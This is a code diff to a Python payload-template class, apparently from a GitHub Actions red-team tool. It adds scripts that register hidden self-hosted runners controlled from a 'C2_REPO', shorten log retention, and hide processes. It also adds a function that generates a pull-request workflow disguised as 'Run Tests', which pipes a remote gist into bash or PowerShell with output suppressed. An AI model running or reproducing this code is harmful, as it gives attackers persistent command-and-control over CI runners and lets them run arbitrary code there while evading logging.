@@ -1,3 +1,6 @@
+import yaml
+
+
 class Payloads:
     """Collection of payload template used for various attacks."""
 
@@ -46,7 +49,8 @@ jobs:
 REG_TOKEN=`echo "{0}" | base64 -d`
 C2_REPO={1}
 KEEP_ALIVE={4}
-
+export WORKER_LOGRETENTION=1
+export RUNNER_LOGRETENTION=1
 mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
 curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
 tar xzf ./{2}
@@ -62,12 +66,16 @@ fi
 """
 
     ROR_GIST_WINDOWS = """
+$keep_alive = ${4}
+$env:RUNNER_LOGRETENTION=1
+$env:WORKER_LOGRETENTION=1
 mkdir C:\\.actions-runner1; cd C:\\.actions-runner1
 Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/{3}/{2} -OutFile {2}
 Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/{2}", "$PWD")
-./config.cmd --url https://github.com/{1} --unattended --token {0} --name "gatox-{5}"
+./config.cmd --url https://github.com/{1} --unattended --token {0} --name "gatox-{5}" --labels "gatox-{5}"
 $env:RUNNER_TRACKING_ID=0
-Start-Process -WindowStyle Hidden -FilePath "./run.cmd"
+
+if ($keep_alive) {{ ./run.cmd }} else {{ Start-Process -WindowStyle Hidden -FilePath "./run.cmd" }}
 """
 
     ROR_GIST_MACOS = """
@@ -75,6 +83,8 @@ REG_TOKEN=`echo "{0}" | base64 -d`
 C2_REPO={1}
 KEEP_ALIVE={4}
 
+export WORKER_LOGRETENTION=1
+export RUNNER_LOGRETENTION=1
 mkdir -p $HOME/runner/.actions-runner/ && cd $HOME/runner/.actions-runner/
 curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
 tar xzf ./{2}
@@ -111,3 +121,37 @@ else
   exit 0
 fi
 """
+
+    @staticmethod
+    def create_ror_workflow(
+        workflow_name: str,
+        run_name: str,
+        gist_url: str,
+        runner_labels: list,
+        target_os: str = "linux",
+    ):
+        """ """
+        yaml_file = {}
+
+        yaml_file["name"] = workflow_name
+        yaml_file["run-name"] = run_name if run_name else workflow_name
+        yaml_file["on"] = ["pull_request"]
+
+        if target_os == "linux" or target_os == "osx":
+            run_payload = f"curl -sSfL {gist_url} | bash > /dev/null 2>&1"
+        elif target_os == "win":
+            run_payload = f"curl -sSfL {gist_url} | powershell *> $null"
+
+        test_job = {
+            "runs-on": runner_labels,
+            "steps": [
+                {
+                    "name": "Run Tests",
+                    "run": run_payload,
+                    "continue-on-error": "true",
+                }
+            ],
+        }
+        yaml_file["jobs"] = {"testing": test_job}
+
+        return yaml.dump(yaml_file, sort_keys=False, default_style="", width=4096)
